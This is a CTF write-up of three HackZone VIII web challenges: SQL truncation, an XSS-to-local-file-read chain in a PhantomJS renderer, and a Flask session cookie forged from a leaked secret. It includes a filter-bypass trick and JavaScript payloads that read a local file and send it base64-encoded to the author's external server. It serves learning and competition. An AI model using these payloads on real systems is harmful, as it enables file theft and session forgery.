# **HackZone VIII Web Writeups** #
Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D

![TASK](https://imgur.com/xrafZEo.png)

# **BabyWeb1(722pts)(10 solves)** #

![TASK](https://imgur.com/zu1XKQe.png)

In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.

![TASK](https://imgur.com/9hXA90t.png)

Trying to post a picture with the same title of the posted pictures will be denied so let's try SQL truncation attack and submit a picture with these details :

- Title : "naaah                                                                 "
- url : "anything here"
-msg : "anything"

And Bingo it passed the title check and we got a password :D 

![TASK](https://imgur.com/rywyGg4.png)

Using this password will give us the details of the picture and the flag if we check the source code :D

![TASK](https://imgur.com/bpK7N8F.png)

# **Insecure(884pts)(4 solves)** #

![TASK](https://imgur.com/ehpXH1T.png)

I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.

![TASK](https://imgur.com/lISjgSe.png)

Accessing this url will give us the first part (The same bucket where Hackzone Logo is stored)
> https://storage.googleapis.com/hzviii/flag_part1.txt

**1st Part:** HZVIII{Buck3t_M1sc0nf1gur4t1on_

Let's start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files .
It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd

After some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it's using phantom Js to convert this text .

![TASK](https://imgur.com/UAn5UOk.png)

Our scenario now is revealed , we'll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered .
I passed a lot of time in this part and tried a lot with basically this payload but i didn't get anything :

```
<img src="aa" onerror="function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="http://100.26.206.184:1234/?a='+b64+'"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener('load', reqListener); 
oReq.open('GET', 'file:///psycor/flag_part2.txt'); 
oReq.send();">
```
I have than tried to read it using iframes but i didn't have any results :'( 

![TASK](https://imgur.com/bZInnkb.png)

This was really painful xd i thinked that maybe using onerror attribute , phantom Js won't wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it's filtered so all we have to do is bypass this filter :D

![TASK](https://imgur.com/ySPcXuS.png)

As we see in the picture below , the script word is stripped so what if we enter :
> scscriptript

The script word will be stripped and Bingo we will have our script tag , let's try it 

![TASK](https://imgur.com/OqHP5I5.png)

Yeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :

```html
<scscriptript src="http://100.26.206.184:1234/test.js"></scscriptript>
```
**NOTE :** It's my VPS IP so DONT use it :D

And i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below

```javascript
function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="http://100.26.206.184:1234/?a='+b64+'"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///psycor/flag_part2.txt"); 
oReq.send();
```

And yees we received an answer :D

![TASK](https://i.imgur.com/hTbrKXX.png)

Base64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts 

# **Calculator(722pts)(10 solves)** #

This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D

![TASK](https://imgur.com/iLqircE.png)

We will now leak the Secret key of the app and sign a session cookie that has the attribute "is_admin" set to True .

![TASK](https://imgur.com/jTwwuLm.png)

To do that we will use flask-unsign tool with the following command :

> flask-unsign --sign --cookie "{'is_admin': True}" --secret 'DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8' --legacy

![TASK](https://imgur.com/NIEbykl.png)

And changing the cookie will give us the flag !

![TASK](https://imgur.com/xOhQh4y.png)

I want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn't have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1
